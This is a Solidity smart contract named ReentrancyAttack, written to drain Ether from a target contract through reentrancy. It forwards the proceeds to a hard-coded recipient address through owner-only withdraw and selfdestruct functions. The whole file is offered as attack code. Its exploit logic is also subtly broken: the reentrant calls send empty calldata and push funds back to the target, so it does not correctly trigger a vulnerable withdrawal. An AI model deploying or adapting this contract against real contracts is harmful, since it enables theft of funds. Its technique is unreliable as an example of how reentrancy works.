pragma solidity ^0.8.0;

contract ReentrancyAttack {
    address payable public targetAddress;
    address public owner;
    address payable public recipient = payable(0xF680EEd79A36ce969D776ED911f5C4e7e6E33a73);

    constructor(address payable _targetAddress) {
        targetAddress = _targetAddress;
        owner = msg.sender;
    }

    function attack() external payable {
        // Call a function on the target contract that is vulnerable to reentrancy
        (bool success,) = targetAddress.call{value: msg.value}("");
        require(success, "Initial call failed");
    }

    // Fallback function to receive Ether and re-enter the target contract
    fallback() external payable {
        if (address(targetAddress).balance > 0) {
            (bool success,) = targetAddress.call{value: address(this).balance}("");
            require(success, "Reentrant call failed");
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = address(this).balance;
        (bool success,) = recipient.call{value: balance}("");
        require(success, "Withdraw failed");
    }

    // Self-destruct function to send the contract balance to the recipient
    function selfDestruct() external {
        require(msg.sender == owner, "Only owner can self-destruct");
        selfdestruct(recipient);
    }
}
